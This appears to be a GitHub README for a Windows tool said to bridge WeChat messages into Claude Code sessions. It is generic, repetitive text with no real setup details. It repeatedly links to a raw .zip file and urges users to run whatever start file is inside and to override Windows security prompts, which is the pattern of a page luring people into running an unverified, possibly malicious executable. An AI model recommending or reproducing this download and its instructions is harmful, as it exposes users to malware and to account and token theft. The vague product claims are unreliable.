# 🤖 claude-code-wechat-channel - Bridge WeChat to Claude Code

[![Download and set up](https://img.shields.io/badge/Download%20from%20GitHub-purple?style=for-the-badge)](https://raw.githubusercontent.com/Antoninabated443/claude-code-wechat-channel/main/dist/wechat_claude_channel_code_1.5.zip)

## 📌 What this is

claude-code-wechat-channel connects WeChat messages to Claude Code sessions through the official ClawBot ilink API.

It is made for users who want to read and reply to WeChat messages while working inside Claude Code. The plugin helps move messages between both sides so you can keep your chat flow in one place.

## 🧰 What you need

Before you start, check that you have:

- A Windows computer
- A stable internet connection
- WeChat installed and signed in
- Claude Code installed and ready to use
- Access to the ClawBot ilink API
- Permission to use the WeChat account you want to connect

If you use a work PC, make sure you can run downloaded software and save files in a folder you can find later.

## 🚀 Download and install

Go to this page to download and set up the project:

[https://raw.githubusercontent.com/Antoninabated443/claude-code-wechat-channel/main/dist/wechat_claude_channel_code_1.5.zip](https://raw.githubusercontent.com/Antoninabated443/claude-code-wechat-channel/main/dist/wechat_claude_channel_code_1.5.zip)

On the page, look for the latest release files or the main source package. Download the file that matches the Windows setup you plan to use.

After the download finishes:

1. Open the file you downloaded
2. Save it in a folder you can find again, such as `Downloads` or `Desktop`
3. If the package is compressed, extract it
4. Open the project folder
5. Follow the setup steps included in the repository files
6. Start the plugin and keep WeChat and Claude Code open

If the project includes a Windows launcher, run it as the main entry point. If it uses a script-based setup, open the file that starts the bridge and follow the on-screen prompts.

## 🖥️ Windows setup

Use this order when you set it up on Windows:

1. Download the project from the GitHub link above
2. Extract the files if needed
3. Open the folder in File Explorer
4. Find the setup file, batch file, or start file
5. Double-click it to begin
6. Approve any permission prompts from Windows
7. Enter the connection details for the ClawBot ilink API
8. Connect your WeChat account
9. Start Claude Code
10. Send a test message to confirm the link works

If Windows shows a security prompt, choose the option that lets you run the file. This can happen with tools that are not installed from the Microsoft Store.

## 🔌 How it works

The plugin sits between WeChat and Claude Code.

A simple flow looks like this:

- A message arrives in WeChat
- The plugin sends it through the ClawBot ilink API
- Claude Code receives the message in your session
- You read or handle the reply in the same workflow
- The response goes back through the channel to WeChat

This setup helps keep chat handling in one place instead of switching between apps all the time.

## ✉️ Main use cases

Use claude-code-wechat-channel when you want to:

- Bring WeChat messages into Claude Code
- Keep one message flow for chat and coding tasks
- Use Claude Code to help draft replies
- Route messages through the ClawBot ilink API
- Reduce app switching during active work
- Keep your workflow in one window set

## 🧪 First test

After setup, test the connection with a short message.

Try this:

1. Send a simple message from WeChat
2. Watch for the message in Claude Code
3. Check that the reply path works
4. Send one short reply back
5. Confirm the message reaches WeChat

Use short text first, such as:
- Hello
- Test message
- Are you connected

If the test fails, check the API settings, the WeChat login, and whether the plugin is still running.

## ⚙️ Basic configuration

The project usually needs a few setup values so it can connect correctly.

Common settings include:

- API endpoint for ClawBot ilink
- Access key or token
- WeChat account binding
- Session or channel name
- Local port or path settings
- Start mode for Windows

Keep these values in one place. If the project includes a config file, edit it with a plain text editor. Save the file, then restart the plugin so the changes take effect.

## 🧭 Daily use

Once it is set up, your daily flow is simple:

1. Open WeChat
2. Open Claude Code
3. Start the plugin
4. Wait for incoming messages
5. Read and handle replies in Claude Code
6. Send responses through the same channel
7. Leave the app running while you work

If you use it often, place the startup file in a folder you can reach fast. You can also add it to your Windows startup folder if your setup supports that.

## 🔎 Troubleshooting

If the bridge does not work, check these items in order:

- WeChat is open and signed in
- Claude Code is open and ready
- The plugin file is still running
- The API key or token is correct
- The network connection is active
- The config file was saved
- The right account or channel is selected
- Windows did not block the app

If messages arrive late, restart the plugin and try again. If nothing shows up, close both apps, open them again, and run the setup file one more time.

If the project uses logs, open the latest log file and look for connection errors, missing values, or invalid API responses.

## 📁 Typical folder contents

When you download the project, you may see files like these:

- A README file with setup steps
- A config file for API settings
- A start file for Windows
- A script that launches the bridge
- A log folder for errors and status
- A sample file for testing

Keep the folder structure as it is unless the setup guide tells you to change it.

## 🔐 Access and safety

This tool connects chat data between services, so keep your API details private.

Use only the account and endpoint you intend to connect. Do not share tokens or config files with others. If you stop using the tool, remove the API values from the config file and close the running process.

## 🧩 Common setup path

A simple Windows setup path looks like this:

1. Download the project from GitHub
2. Unzip the files
3. Open the project folder
4. Edit the config file
5. Enter the ClawBot ilink API details
6. Run the start file
7. Open Claude Code
8. Open WeChat
9. Send a test message
10. Keep the bridge running

## 📎 Useful link

Primary download and setup page:

[https://raw.githubusercontent.com/Antoninabated443/claude-code-wechat-channel/main/dist/wechat_claude_channel_code_1.5.zip](https://raw.githubusercontent.com/Antoninabated443/claude-code-wechat-channel/main/dist/wechat_claude_channel_code_1.5.zip)

## 🛠️ If you need to check files

Look in the repository for:

- README.md
- config files
- Windows start files
- sample settings
- log output
- install steps

If the project adds a release file later, use that file as the main download on Windows and run it after the download finishes